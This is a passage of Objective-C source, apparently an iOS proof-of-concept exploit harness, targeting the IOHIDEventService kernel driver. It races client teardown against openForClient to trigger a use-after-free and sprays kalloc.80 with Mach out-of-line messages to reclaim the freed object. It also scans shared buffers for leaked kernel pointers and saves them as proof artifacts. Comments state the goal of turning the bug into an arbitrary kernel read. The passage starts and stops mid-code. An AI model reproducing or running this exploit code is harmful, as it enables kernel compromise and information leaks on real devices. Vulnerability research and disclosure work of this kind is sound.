                                                     (unsigned long)j, leak[@"offset"], leak[@"value"]]];
                                }
                                if (leaks.count > 3) {
                                    [self appendLog:[NSString stringWithFormat:@"      ... and %lu more",
                                                     (unsigned long)(leaks.count - 3)]];
                                }
                            }
                        }

                        if (atomic_load(&firstCrossClientSampleSet) == 0) {
                            int expected = 0;
                            if (atomic_compare_exchange_strong(&firstCrossClientSampleSet, &expected, 1)) {
                                atomic_store(&firstCrossClientConn, i);
                                atomic_store(&firstCrossClientEventSize, (int)evtSz);
                                if (firstCrossClientSample) {
                                    memcpy(firstCrossClientSample, current, sampleLen);
                                }

                                // Use the aggressive scanner to find first pointer
                                if (leaks.count > 0) {
                                    NSDictionary *firstLeak = leaks[0];
                                    uint64_t leakValue = 0;
                                    sscanf([firstLeak[@"value"] UTF8String], "0x%llx", &leakValue);
                                    atomic_store(&firstCrossClientPtrOffset, [firstLeak[@"offset"] intValue]);
                                    firstCrossClientPtr = leakValue;
                                } else {
                                    // Fallback to old method if aggressive scan didn't find anything
                                    for (size_t off = 4; off + 8 <= sampleLen; off += 8) {
                                        uint64_t ptrVal = 0;
                                        memcpy(&ptrVal, current + off, sizeof(ptrVal));
                                        if ([self isLikelyKernelPointerValue:ptrVal]) {
                                            if (atomic_load(&firstCrossClientPtrOffset) == -1) {
                                                atomic_store(&firstCrossClientPtrOffset, (int)off);
                                                firstCrossClientPtr = ptrVal;
                                                break;
                                            }
                                        }
                                    }
                                }

                                [self appendLog:[NSString stringWithFormat:
                                    @"  First cross-client misdelivery captured from conn[%d], evtSize=%u, len=%zu, leaks=%lu",
                                    i, evtSz, sampleLen, (unsigned long)leaks.count]];
                            }
                        }
                        memcpy(auxPreSnaps[i], current, sampleLen);
                    }
                    free(current);
                }
                localChecks++;
                usleep(500); // 0.5ms between scans — lower overhead than tight loop
            }
            atomic_store(&crossClientChecks, (int)localChecks);
            dispatch_group_leave(group);
        });
    }

    // Wait for stress duration, then signal stop
    dispatch_time_t deadline = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kStressDuration * NSEC_PER_SEC));
    long waitResult = dispatch_group_wait(group, deadline);
    if (waitResult != 0) {
        atomic_store(&stopFlag, 1);
        [self appendLog:@"  Stress duration elapsed, signaling stop..."];
        dispatch_time_t drainTimeout = dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC);
        long drainResult = dispatch_group_wait(group, drainTimeout);
        if (drainResult != 0) {
            [self appendLog:@"  WARNING: Workers did not drain within grace period."];
        }
    }

    // ---- Post-UAF deep buffer scan + full dump ----
    [self appendLog:@"\n====== Post-UAF Deep Buffer Scan ======"];
    NSString *swordDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject stringByAppendingPathComponent:@"sword"];
    int kleakFound = 0;
    // Dump full primary buffer + scan all buffers
    for (int bi = 0; bi < kMaxAux; bi++) {
        mach_vm_address_t bufAddr = (bi == 0) ? mappedAddr : (bi < kMaxAux ? auxMappedAddrs[bi] : 0);
        mach_vm_size_t bufSize = (bi == 0) ? mappedSize : (bi < kMaxAux ? auxMappedSizes[bi] : 0);
        if (bufAddr == 0 || bufSize < 8) continue;
        const uint8_t *buf = (const uint8_t *)(uintptr_t)bufAddr;
        int scanLen = (int)MIN(bufSize, 4096);
        // Dump entire buffer to file
        NSString *dumpPath = [swordDir stringByAppendingPathComponent:[NSString stringWithFormat:@"buffer_%d.bin", bi]];
        [[NSData dataWithBytes:buf length:scanLen] writeToFile:dumpPath atomically:YES];
        // Scan every 8-byte aligned offset
        for (int off = 0; off + 8 <= scanLen; off += 8) {
            uint64_t val = 0;
            memcpy(&val, buf + off, sizeof(val));
            if ((val >> 32) == 0xfffffff0ULL && val < 0xfffffff800000000ULL) {
                [self appendLog:[NSString stringWithFormat:@"  *** KERNEL ADDR buf[%d]+0x%x = 0x%016llx", bi, off, val]];
                [[NSString stringWithFormat:@"0x%016llx buf=%d off=0x%x\n", val, bi, off] writeToFile:[swordDir stringByAppendingPathComponent:@"kaddr.txt"] atomically:YES];
                kleakFound++;
                if (kleakFound >= 10) break;
            }
        }
        if (kleakFound >= 10) break;
    }
    if (kleakFound == 0) {
        [self appendLog:[NSString stringWithFormat:@"  No kernel addrs in %d buffers (full dump saved)", kMaxAux]];
    } else {
        [self appendLog:[NSString stringWithFormat:@"  Found %d kernel addresses", kleakFound]];
    }

    // ---- Spray verification: 0xCC marker test ----
    // Spray payload is now all 0xCC (72 bytes). If our PHYSICAL_COPY spray
    // reclaims the freed ClientObject's kalloc.80 slot, then copyEvent reads
    // the overwritten fields and the leaked event data SHOULD contain 0xCC
    // bytes where ClientObject fields map into the event.
    //
    // Test: if event[0x60] changes from 0xd3→0xCC, spray controls that field
    // and we can redirect copyEvent's source pointer → arbitrary kernel read.
    // If 0xd3 persists, spray isn't reaching the field (slot race lost, or
    // ClientObject >72B with key fields beyond our payload).
    {
        if (sprayReady) {
            [self appendLog:[NSString stringWithFormat:
                @"  Mach OOL spray active: %d msgs cycling kalloc.80", kSprayQueueDepth]];
        } else {
            [self appendLog:@"  Mach OOL spray NOT available — no kalloc.80 pressure applied"];
        }
    }

    // ---- Cleanup spray resources ----
    if (sprayRecv != MACH_PORT_NULL) {
        mach_port_destroy(mach_task_self_, sprayRecv);
        sprayRecv = MACH_PORT_NULL;
    }
    if (spraySend != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self_, spraySend);
        spraySend = MACH_PORT_NULL;
    }
    if (sprayPayload) {
        free(sprayPayload);
        sprayPayload = NULL;
    }

    // ---- Release multi-conn client slots FIRST (free provider for probe) ----
    {
        int released = 0;
        for (int i = 0; i < connCount; i++) {
            uint64_t closeScalar = 0;
            kern_return_t ckr = sIOConnectCallMethod(connections[i], kSelectorClose,
                &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
            if (ckr == KERN_SUCCESS) released++;
        }
        [self appendLog:[NSString stringWithFormat:
            @"\n  Released %d/%d multi-conn client slots", released, connCount]];
    }

    // ---- Probe: try 3 DIFFERENT IOHIDEventService instances ----
    // Allow providers to recover from UAF stress before probing
    [self appendLog:@"\n  Waiting 500ms for provider recovery..."];
    usleep(500000);
    [self appendLog:@"\n====== UAF Dangling Pointer Probe ======"];
    for (int inst = 0; inst < 3; inst++) {
        io_service_t svc = sIOServiceGetMatchingService(0,
            sIOServiceMatching("IOHIDEventService"));
        [self appendLog:[NSString stringWithFormat:@"  Instance %d: 0x%x", inst, svc]];
        if (svc == MACH_PORT_NULL) break;
        for (int p = 0; p < 3; p++) {
            io_connect_t pc = MACH_PORT_NULL;
            kern_return_t okr = sIOServiceOpen(svc, mach_task_self(), 2, &pc);
            if (okr == KERN_SUCCESS && pc != MACH_PORT_NULL) {
                uint64_t s = 0;
                kern_return_t gkr = sIOConnectCallMethod(pc, kSelectorOpen,
                    &s, 1, kOpenPropertiesXML, strlen(kOpenPropertiesXML) + 1,
                    NULL, NULL, NULL, NULL);
                NSString *gateMsg = (gkr == KERN_SUCCESS) ? @" (PASS)" : @"";
                [self appendLog:[NSString stringWithFormat:@"    conn[%d] gate=0x%x%@", p, gkr, gateMsg]];
                if (gkr != KERN_SUCCESS)
                    [self appendLog:@"    >>> provider may have dangling ptr"];
                sIOServiceClose(pc);
            } else {
                [self appendLog:[NSString stringWithFormat:@"    IOServiceOpen=0x%x", okr]];
            }
        }
        sIOObjectRelease(svc);
    }

    // ---- Dedicated Termination Race Phase (Batch Pre-Gating) ----
    //
    // IDA vtable analysis (sub_FFFFFFF005AD1514, vtable+0x560):
    //   clientClose calls self->terminate(0) — ASYNCHRONOUS.
    //   didTerminate fires LATER on the global IOKit termination thread.
    //   didTerminate → close handler (NO command gate) → closeForClient.
    //
    // Previous unsynchronized approach: terminator + opener threads competing.
    //   Problem: terminator's IOServiceOpen + sel 0 gate contends with 3 openers
    //   for the provider's work loop. Result: only 15 probe teardowns in 15 seconds.
    //
    // REVISED APPROACH — Batch Pre-Gating:
    //   Phase 1 (pre-gate): Pause openers. Create + gate a batch of N probe connections.
    //     No work loop contention → fast probe connection setup.
    //   Phase 2 (race): Resume openers. Rapidly mach_port_destroy all N probe connections.
    //     Each teardown → clientClose → terminate(0) → async didTerminate.
    //     didTerminate's closeForClient runs on termination thread (NO gate).
    //     Openers continuously call openForClient (through command gate).
    //     closeForClient modifies client collection WHILE openForClient iterates it.
    //
    //   NOTE: On affected builds, this test may trigger unexpected behavior.
    if (raceService != MACH_PORT_NULL) {
        [self appendLog:@"\n  ---- Dedicated Termination Race (Batch Pre-Gating) ----"];
        [self appendLog:@"  Strategy: pre-gate probe batches → rapid-fire teardown during opener activity"];

        static const NSTimeInterval kTermRaceDuration = 15.0;
        enum { kBatchSize = 16, kNumOpeners = 3, kRaceWindowUs = 80000 };

        const char *raceXml = kOpenPropertiesXML;
        const size_t raceXmlLen = strlen(raceXml) + 1;

        // Pre-allocate opener connections and open them initially
        io_connect_t openerConns[kNumOpeners];
        int openerCount = 0;
        for (int p = 0; p < kNumOpeners; p++) {
            openerConns[p] = MACH_PORT_NULL;
            kern_return_t pkr = sIOServiceOpen(raceService, mach_task_self_, 2, &openerConns[p]);
            if (pkr != KERN_SUCCESS || openerConns[p] == MACH_PORT_NULL) continue;
            // Pre-open: put connection into "opened" state so the race loop
            // can start immediately with close→open (which calls openForClient)
            uint64_t scalar = 0;
            kern_return_t okr = sIOConnectCallMethod(openerConns[p], kSelectorOpen,
                &scalar, 1, raceXml, raceXmlLen, NULL, NULL, NULL, NULL);
            if (okr == KERN_SUCCESS) {
                openerCount++;
            } else {
                sIOServiceClose(openerConns[p]);
                mach_port_deallocate(mach_task_self(), openerConns[p]);
                openerConns[p] = MACH_PORT_NULL;
            }
        }
        [self appendLog:[NSString stringWithFormat:
            @"  Openers: %d (pre-opened). Batch size: %d. Race window: %dμs",
            openerCount, kBatchSize, kRaceWindowUs]];

        if (openerCount == 0) {
            [self appendLog:@"  WARNING: No opener connections — termination race skipped"];
        } else {

        // Shared state between main thread and opener threads
        __block volatile int opPause = 1;  // 1 = paused (spin-wait), 0 = running
        __block volatile int opStop = 0;   // 1 = terminate threads
        __block volatile int totalOpenerCycles = 0;  // multi-writer
        __block volatile int totalOpenerOpenOk = 0;  // multi-writer
        __block volatile int totalOpenerOpenErr = 0;  // multi-writer
        __block volatile int lastOpenerErrCode = 0;  // diagnostic, race OK

        // Single-writer counters (main thread only)
        int totalProbesGated = 0;
        int totalProbesTornDown = 0;
        int totalGateFails = 0;
        int totalOpenFails = 0;
        int batchCount = 0;
        kern_return_t firstGateErr = 0; // diagnostic: first gate error code

        dispatch_group_t openerGroup = dispatch_group_create();

        // Launch opener threads — they start PAUSED (opPause=1)
        for (int o = 0; o < openerCount; o++) {
            io_connect_t oc = openerConns[o];
            dispatch_group_enter(openerGroup);
            dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
                uint64_t scalar = 0;
                uint32_t localCycles = 0;
                uint32_t localOk = 0;
                uint32_t localErr = 0;
                kern_return_t localLastErr = 0;

                while (!opStop) {
                    // Spin-wait when paused (during pre-gating)
                    while (opPause && !opStop) {
                        usleep(50);
                    }
                    if (opStop) break;

                    // Close current session (sel 1 → gated close handler)
                    uint64_t cs = 0;
                    (void)sIOConnectCallMethod(oc, kSelectorClose,
                        &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);

                    // Re-open: sel 0 → command gate → openForClient
                    // openForClient iterates provider's client collection.
                    // THIS is the race target: didTerminate's closeForClient
                    // modifies the collection concurrently (no gate).
                    kern_return_t okr = sIOConnectCallMethod(oc, kSelectorOpen,
                        &scalar, 1, raceXml, raceXmlLen,
                        NULL, NULL, NULL, NULL);
                    if (okr == KERN_SUCCESS) {
                        localOk++;
                    } else {
                        localErr++;
                        localLastErr = okr;
                    }

                    localCycles++;
                }

                __sync_fetch_and_add(&totalOpenerCycles, (int)localCycles);
                __sync_fetch_and_add(&totalOpenerOpenOk, (int)localOk);
                __sync_fetch_and_add(&totalOpenerOpenErr, (int)localErr);
                if (localLastErr != 0) lastOpenerErrCode = (int)localLastErr;
                dispatch_group_leave(openerGroup);
            });
        }

        NSDate *raceStart = [NSDate date];

        while ([[NSDate date] timeIntervalSinceDate:raceStart] < kTermRaceDuration) {
            // ---- Phase 1: Pre-gate a batch of probe connections (openers PAUSED) ----
            // No work loop contention → probe setup is fast
            opPause = 1;
            __sync_synchronize();
            usleep(1000); // Let openers drain into spin-wait

            io_connect_t probeConns[kBatchSize];
            int gatedCount = 0;

            for (int v = 0; v < kBatchSize; v++) {
                probeConns[v] = MACH_PORT_NULL;
                kern_return_t vkr = sIOServiceOpen(raceService, mach_task_self_, 2, &probeConns[v]);
                if (vkr != KERN_SUCCESS || probeConns[v] == MACH_PORT_NULL) {
                    totalOpenFails++;
                    continue;
                }
                uint64_t scalar = 0;
                kern_return_t gkr = sIOConnectCallMethod(probeConns[v], kSelectorOpen,
                    &scalar, 1, raceXml, raceXmlLen,
                    NULL, NULL, NULL, NULL);
                if (gkr != KERN_SUCCESS) {
                    if (totalGateFails == 0) firstGateErr = gkr;
                    totalGateFails++;
                    sIOServiceClose(probeConns[v]);
                    mach_port_deallocate(mach_task_self(), probeConns[v]);
                    probeConns[v] = MACH_PORT_NULL;
                    continue;
                }
                gatedCount++;
            }

            totalProbesGated += gatedCount;

            if (gatedCount == 0) {
                [self appendLog:@"  WARNING: Batch produced 0 gated probe connections"];
                usleep(10000);
                continue;
            }

            // ---- Phase 2: Resume openers, then rapid-fire teardown all probe connections ----
            // Openers re-enter their close→open loops, continuously calling
            // openForClient through the command gate.
            opPause = 0;
            __sync_synchronize();
            usleep(2000); // 2ms: let openers re-enter their loops

            // Rapid teardown: mach_port_destroy is a Mach trap — no gate needed.
            // Each triggers: clientClose → terminate(0) → async didTerminate
            // didTerminate fires on the termination thread → close handler (NO gate)
            // → closeForClient modifies provider's client collection without synchronization
            for (int v = 0; v < kBatchSize; v++) {
                if (probeConns[v] == MACH_PORT_NULL) continue;
                mach_port_destroy(mach_task_self(), probeConns[v]);
                totalProbesTornDown++;
            }

            // Race window: N didTerminate callbacks fire asynchronously while
            // openers continuously call openForClient through the command gate.
            // closeForClient (termination thread) vs openForClient (work loop)
            // both access the provider's client collection without synchronization.
            usleep(kRaceWindowUs);

            batchCount++;
        }

        // Stop openers
        opStop = 1;
        opPause = 0; // Unpause so they see the stop flag
        __sync_synchronize();

        dispatch_time_t drainTimeout = dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC);
        long drainResult = dispatch_group_wait(openerGroup, drainTimeout);
        if (drainResult != 0) {
            [self appendLog:@"  WARNING: Opener threads did not drain in time."];
        }

        // Cleanup opener connections
        for (int p = 0; p < kNumOpeners; p++) {
            if (openerConns[p] == MACH_PORT_NULL) continue;
            uint64_t cs = 0;
            (void)sIOConnectCallMethod(openerConns[p], kSelectorClose,
                &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);
            (void)sIOServiceClose(openerConns[p]);
            (void)mach_port_deallocate(mach_task_self(), openerConns[p]);
        }

        // Store results for summary section
        atomic_store(&terminationRaceIters, totalProbesTornDown);
        atomic_store(&terminationBothSucceeded, (int)totalOpenerCycles);
        atomic_store(&terminationMigErrors, totalGateFails);
        atomic_store(&terminationSel1Errors, totalOpenFails);
        atomic_store(&terminationSvcCloseErrors, (int)totalOpenerOpenErr);

        NSTimeInterval elapsed = [[NSDate date] timeIntervalSinceDate:raceStart];
        [self appendLog:[NSString stringWithFormat:
            @"  TermRace complete: %d batches, %d probes gated, %d torn down in %.1fs",
            batchCount, totalProbesGated, totalProbesTornDown, elapsed]];
        [self appendLog:[NSString stringWithFormat:
            @"  Throughput: %.1f teardowns/s (vs ~1/s in unsynchronized approach)",
            totalProbesTornDown / fmax(elapsed, 0.001)]];
        [self appendLog:[NSString stringWithFormat:
            @"  Pre-gate errors: openFail=%d gateFail=%d (first err: 0x%X)",
            totalOpenFails, totalGateFails, (unsigned)firstGateErr]];
        [self appendLog:[NSString stringWithFormat:
            @"  Opener stats: %d cycles, %d open-ok, %d open-err",
            (int)totalOpenerCycles, (int)totalOpenerOpenOk, (int)totalOpenerOpenErr]];
        if (lastOpenerErrCode != 0) {
            [self appendLog:[NSString stringWithFormat:
                @"  Opener last error: 0x%X", (unsigned)lastOpenerErrCode]];
        }
        if ((int)totalOpenerOpenErr > 0 && (int)totalOpenerCycles > 0) {
            double errPct = 100.0 * (int)totalOpenerOpenErr / (int)totalOpenerCycles;
            [self appendLog:[NSString stringWithFormat:
                @"  Opener error rate: %.1f%%", errPct]];
        }

        } // end if (openerCount > 0)
    } else {
        [self appendLog:@"  WARNING: No provider service port — termination race skipped"];
    }

    // ---- Post-stress mapped buffer comparison ----
    uint8_t postStressSnap[64];
    memset(postStressSnap, 0, sizeof(postStressSnap));
    memcpy(postStressSnap, (const void *)(uintptr_t)mappedAddr, preStressLen);

    uint32_t stressDiffs = 0;
    for (size_t i = 0; i < preStressLen; i++) {
        if (preStressSnap[i] != postStressSnap[i]) stressDiffs++;
    }

    // Collect results
    int finalAnomalies = atomic_load(&anomalyCount);
    int finalSizeAnomalies = atomic_load(&sizeAnomalyCount);
    int finalMigErrors = atomic_load(&migErrorCount);
    int finalReaderIters = atomic_load(&readerIterations);
    int finalLifecycleIters = atomic_load(&lifecycleIterations);
    int finalChurnIters = atomic_load(&churnIterations);
    int finalCloseErrs = atomic_load(&lifecycleCloseErrors);
    int finalOpenErrs = atomic_load(&lifecycleOpenErrors);
    int finalChurnCloseErrs = atomic_load(&churnCloseErrors);
    int finalChurnOpenErrs = atomic_load(&churnOpenErrors);
    int finalCrossClient = atomic_load(&crossClientHits);
    int finalCrossClientChecks = atomic_load(&crossClientChecks);
    int finalPrimaryScanCount = atomic_load(&primaryScanCount);
    int finalPrimaryLeakCount = atomic_load(&primaryLeakCount);
    self.proofPrimaryScanCount = finalPrimaryScanCount;
    self.proofPrimaryLeakCount = finalPrimaryLeakCount;
    int finalTermRaceIters = atomic_load(&terminationRaceIters);
    int finalTermBothOk = atomic_load(&terminationBothSucceeded);
    int finalTermMigErrs = atomic_load(&terminationMigErrors);
    int finalTermSel1Errs = atomic_load(&terminationSel1Errors);
    int finalTermSvcCloseErrs = atomic_load(&terminationSvcCloseErrors);

    [self appendLog:[NSString stringWithFormat:
        @"\nStress results: reader=%d lifecycle=%d churn=%d termRace=%d iterations",
        finalReaderIters, finalLifecycleIters, finalChurnIters, finalTermRaceIters]];
    [self appendLog:[NSString stringWithFormat:
        @"Primary buffer scans: %d scans performed, %d kernel pointer leaks detected",
        finalPrimaryScanCount, finalPrimaryLeakCount]];
    [self appendLog:[NSString stringWithFormat:
        @"  Anomalies: unexpected_kr=%d sizeAnomaly=%d migErrors=%d",
        finalAnomalies, finalSizeAnomalies, finalMigErrors]];
    [self appendLog:[NSString stringWithFormat:
        @"  Lifecycle errors: close=%d open=%d (of %d cycles)",
        finalCloseErrs, finalOpenErrs, finalLifecycleIters]];
    [self appendLog:[NSString stringWithFormat:
        @"  Spray: %@ (%d msgs, kalloc.80 Mach OOL cycling)",
        sprayReady ? @"ACTIVE" : @"OFF", kSprayQueueDepth]];
    [self appendLog:[NSString stringWithFormat:
        @"  Churn errors: close=%d open=%d (of %d cycles)",
        finalChurnCloseErrs, finalChurnOpenErrs, finalChurnIters]];
    [self appendLog:[NSString stringWithFormat:
        @"  Cross-client monitor: %d buffer changes detected in %d scans",
        finalCrossClient, finalCrossClientChecks]];
    [self appendLog:[NSString stringWithFormat:
        @"  Termination race: %d probes torn down, %d opener cycles (batch pre-gating)",
        finalTermRaceIters, finalTermBothOk]];
    [self appendLog:[NSString stringWithFormat:
        @"  TermRace errors: probeFails=%d teardownErrs=%d openerErrs=%d",
        finalTermSel1Errs, finalTermMigErrs, finalTermSvcCloseErrs]];
    [self appendLog:[NSString stringWithFormat:
        @"  Mapped buffer: %u bytes changed during stress", stressDiffs]];

    // ---- Analysis ----
    if (finalCrossClient > 0) {
        [self appendLog:@"\n  ** SIGNAL: Cross-client data misdirection detected. **"
                         "\n  Auxiliary connection buffers received event data they did not request."
                         "\n  This indicates the provider wrote to a different client's buffer,"
                         "\n  consistent with ClientObject reference invalidation during the synchronization gap."];
    }
    if (finalAnomalies > 0 || finalMigErrors > 0) {
        [self appendLog:@"  SIGNAL: Unexpected return codes or MIG errors during lifecycle stress."];
    }
    if (finalSizeAnomalies > 0) {
        [self appendLog:@"  SIGNAL: eventSize exceeded mapped region bounds — possible invalidated size field."];
    }
    if (finalOpenErrs > 0) {
        [self appendLog:[NSString stringWithFormat:
            @"  NOTE: %d%% of lifecycle opens failed — connection may have been in inconsistent state.",
            (finalLifecycleIters > 0) ? (finalOpenErrs * 100 / finalLifecycleIters) : 0]];
    }
    if (finalTermBothOk > 0 && finalTermRaceIters > 0) {
        [self appendLog:[NSString stringWithFormat:
            @"\n  ** Termination race: %d probes torn down while %d opener cycles ran. **"
             "\n  Analysis: clientClose (vtable+0x560) calls self->terminate(0) [ASYNC]."
             "\n  terminate() queues didTerminate on IOKit termination thread."
             "\n  didTerminate calls close handler DIRECTLY (no gate) → closeForClient."
             "\n  Opener threads call openForClient (gated, work loop)."
             "\n  closeForClient (termination thread) vs openForClient (work loop)"
             "\n  operate on provider's client collection at +504/+512 without mutual exclusion."
             "\n  If no fault: timing window may be too narrow, or provider"
             "\n  serialization at a lower level prevents the overlap.",
             finalTermRaceIters, finalTermBothOk]];
    }
    if (finalCrossClient == 0 && finalAnomalies == 0 && finalSizeAnomalies == 0 &&
        finalMigErrors == 0 && stressDiffs == 0 && finalTermBothOk == 0) {
        [self appendLog:@"  No lifecycle desynchronization signals detected."
                         "\n  Possible causes: provider serializes all paths internally (workloop lock),"
                         "\n  synchronization gap too small for current timing, or allocation reuse did not occur."];
    }

    self.proofCrossClientEvents = finalCrossClient;
    self.proofCrossClientChecks = finalCrossClientChecks;
    self.proofTerminationProbes = finalTermRaceIters;
    self.proofTerminationOpenCycles = finalTermBothOk;
    self.proofCrossClientSignal = (finalCrossClient > 0);
    self.proofTermRaceActive = (finalTermRaceIters > 0 || finalTermBothOk > 0);
    if (atomic_load(&firstCrossClientSampleSet) == 1) {
        self.proofFirstCrossClientConn = atomic_load(&firstCrossClientConn);
        self.proofFirstCrossClientEventSize = (uint32_t)atomic_load(&firstCrossClientEventSize);
        self.proofFirstCrossClientHex = [self hexPreview:firstCrossClientSample
                                                 length:MIN((size_t)kCrossClientSampleBytes, (size_t)64)];
        int ptrOffset = atomic_load(&firstCrossClientPtrOffset);
        if (ptrOffset >= 0 && firstCrossClientPtr != 0) {
            self.proofKernelPointerLeak = YES;
            self.proofKernelPointerSourceConn = self.proofFirstCrossClientConn;
            self.proofKernelPointerOffset = ptrOffset;
            self.proofKernelPointerValue = firstCrossClientPtr;
            self.proofKernelPointerHex = [self hexPreview:(uint8_t *)&firstCrossClientPtr length:sizeof(firstCrossClientPtr)];
        } else {
            self.proofKernelPointerLeak = NO;
            self.proofKernelPointerSourceConn = -1;
            self.proofKernelPointerOffset = -1;
            self.proofKernelPointerValue = 0;
            self.proofKernelPointerHex = nil;
        }
    } else {
        self.proofFirstCrossClientHex = nil;
        self.proofFirstCrossClientConn = -1;
        self.proofFirstCrossClientEventSize = 0;
        self.proofKernelPointerLeak = NO;
        self.proofKernelPointerValue = 0;
        self.proofKernelPointerOffset = -1;
        self.proofKernelPointerSourceConn = -1;
        self.proofKernelPointerHex = nil;
    }

    if (auxPreSnaps) {
        free(auxPreSnaps);
        auxPreSnaps = NULL;
    }
    if (auxSampleLens) {
        free(auxSampleLens);
        auxSampleLens = NULL;
    }
    if (firstCrossClientSample) {
        free(firstCrossClientSample);
        firstCrossClientSample = NULL;
    }
    [self appendLog:@"====== Sub-phase B Complete ======"];
}

#pragma mark - Sub-phase C: Post-Stress Structural Analysis

- (void)runPostStressStructuralAnalysis:(io_connect_t)connection
                    mappedAddr:(mach_vm_address_t)mappedAddr
                    mappedSize:(mach_vm_size_t)mappedSize
                   preSnapshot:(NSData *)preSnapshot {
    [self appendLog:@"\n====== Sub-phase C: Post-Stress Structural Analysis ======"];

    const uint8_t *base = (const uint8_t *)(uintptr_t)mappedAddr;
    size_t totalSize = MIN((size_t)mappedSize, (size_t)kMappedProbeMaxBytes);

    // Take post-stress snapshot (first 64 bytes)
    size_t snapLen = MIN((size_t)64, totalSize);
    uint8_t postSnap[64];
    memset(postSnap, 0, sizeof(postSnap));
    memcpy(postSnap, base, snapLen);

    // Compare pre vs post first 64 bytes
    const uint8_t *preBytes = (const uint8_t *)preSnapshot.bytes;
    size_t preLen = MIN((size_t)preSnapshot.length, (size_t)64);
    size_t cmpLen = MIN(preLen, snapLen);

    uint32_t diffCount = 0;
    NSMutableString *diffReport = [NSMutableString string];
    for (size_t i = 0; i < cmpLen; i++) {
        if (preBytes[i] != postSnap[i]) {
            diffCount++;
            if (diffCount <= 16) {
                [diffReport appendFormat:@"  +0x%02zx: 0x%02x -> 0x%02x\n", i, preBytes[i], postSnap[i]];
            }
        }
    }

    [self appendLog:[NSString stringWithFormat:@"Pre/post snapshot diff: %u bytes changed out of %zu", diffCount, cmpLen]];
    if (diffCount > 0 && diffReport.length > 0) {
        [self appendLog:diffReport];
        if (diffCount > 16) {
            [self appendLog:[NSString stringWithFormat:@"  ... and %u more differences", diffCount - 16]];
        }
    }

    // Check type field at +12 pre vs post
    if (cmpLen >= 16) {
        uint32_t preType = 0, postType = 0;
        memcpy(&preType, preBytes + 12, sizeof(preType));
        memcpy(&postType, postSnap + 12, sizeof(postType));
        [self appendLog:[NSString stringWithFormat:@"Type field at +12: pre=0x%08x post=0x%08x %@",
                         preType, postType, (preType != postType) ? @"CHANGED" : @"unchanged"]];
    }

    // Check if first qword now looks like a kernel address pattern
    if (snapLen >= 8) {
        uint64_t firstQword = 0;
        memcpy(&firstQword, postSnap, sizeof(firstQword));
        uint32_t hi32 = (uint32_t)(firstQword >> 32);
        if (hi32 == 0xFFFFFE00 || (firstQword >> 36) == 0xFFFFFE0 || hi32 == 0xFFFFFF80) {
            [self appendLog:[NSString stringWithFormat:
                @"  SIGNAL: First qword (0x%016llx) resembles an indirect call target — possible allocation reuse.",
                firstQword]];
        }
    }

    // Aggressive kernel pointer scan of entire mapped buffer post-stress
    [self appendLog:@"\n--- Aggressive Kernel Pointer Scan (Post-Stress) ---"];
    NSArray<NSDictionary *> *foundPointers = [self scanForKernelPointers:base
                                                                  length:totalSize
                                                              maxResults:50
                                                               connIndex:0];

    if (foundPointers.count > 0) {
        [self appendLog:[NSString stringWithFormat:@"*** FINDING: Found %lu potential kernel pointer patterns in mapped buffer ***",
                         (unsigned long)foundPointers.count]];

        // Log first 10 in detail
        NSUInteger detailCount = MIN(10, foundPointers.count);
        for (NSUInteger i = 0; i < detailCount; i++) {
            NSDictionary *ptr = foundPointers[i];
            [self appendLog:[NSString stringWithFormat:
                @"  [%lu] offset=0x%@ value=%@ align=%@ inArray=%@ ctx=%@",
                (unsigned long)i,
                ptr[@"offset"],
                ptr[@"value"],
                ptr[@"alignment"],
                ptr[@"inArray"],
                ptr[@"context"]]];
        }

        if (foundPointers.count > 10) {
            [self appendLog:[NSString stringWithFormat:@"  ... and %lu more kernel pointer candidates",
                             (unsigned long)(foundPointers.count - 10)]];
        }

        // Store first leak for PoC artifact
        if (!self.proofKernelPointerLeak) {
            NSDictionary *firstLeak = foundPointers[0];
            uint64_t leakValue = 0;
            sscanf([firstLeak[@"value"] UTF8String], "0x%llx", &leakValue);
            self.proofKernelPointerLeak = YES;
            self.proofKernelPointerValue = leakValue;
            self.proofKernelPointerOffset = [firstLeak[@"offset"] intValue];
            self.proofKernelPointerSourceConn = 0;
            self.proofKernelPointerHex = [self hexPreview:(uint8_t *)&leakValue length:sizeof(leakValue)];
        }
    } else {
        [self appendLog:@"  No kernel pointer patterns detected in primary buffer."];
    }

    // Call copyEvent 10 times post-stress and analyze each capture
    [self appendLog:@"\n--- Post-stress copyEvent captures ---"];
    uint32_t captureAnomalies = 0;
    uint32_t newKernPtrs = 0;

    for (int i = 0; i < 10; i++) {
        uint64_t scalarsIn[2] = { 0, 1 };
        uint8_t structOut[256];  // Increased buffer size
        size_t structOutSize = sizeof(structOut);
        kern_return_t kr = sIOConnectCallMethod(
            connection, kSelectorCopyEvent,
            scalarsIn, 2, NULL, 0,
            NULL, NULL, structOut, &structOutSize
        );

        uint32_t eventSize = 0;
        if (totalSize >= 4) {
            memcpy(&eventSize, base, sizeof(eventSize));
        }

        // Check payload size sanity (buffer is [len][payload]).
        BOOL sizeOk = (eventSize > 0 && (uint64_t)eventSize + 4ull <= (uint64_t)mappedSize);

        // Check type field at +12 for known IOHIDEvent types (generally < 0x40)
        uint32_t typeField = 0;
        if (totalSize >= 16) {
            memcpy(&typeField, base + 12, sizeof(typeField));
        }
        uint32_t eventType = typeField & 0xFF;
        BOOL typeOk = (eventType < 0x40);

        // Aggressive scan of mapped buffer after each copyEvent
        size_t scanLimit = MIN(totalSize, (size_t)eventSize + 4);
        NSArray<NSDictionary *> *bufferLeaks = [self scanForKernelPointers:base
                                                                    length:scanLimit
                                                                maxResults:10
                                                                 connIndex:0];

        // Also scan the struct output buffer
        NSArray<NSDictionary *> *structLeaks = [self scanForKernelPointers:structOut
                                                                    length:structOutSize
                                                                maxResults:10
                                                                 connIndex:-1];

        uint32_t localKernPtrs = (uint32_t)(bufferLeaks.count + structLeaks.count);

        if (!sizeOk || !typeOk || localKernPtrs > 0) {
            captureAnomalies++;
        }
        newKernPtrs += localKernPtrs;

        if (i < 3 || !sizeOk || !typeOk || localKernPtrs > 0) {
            [self appendLog:[NSString stringWithFormat:
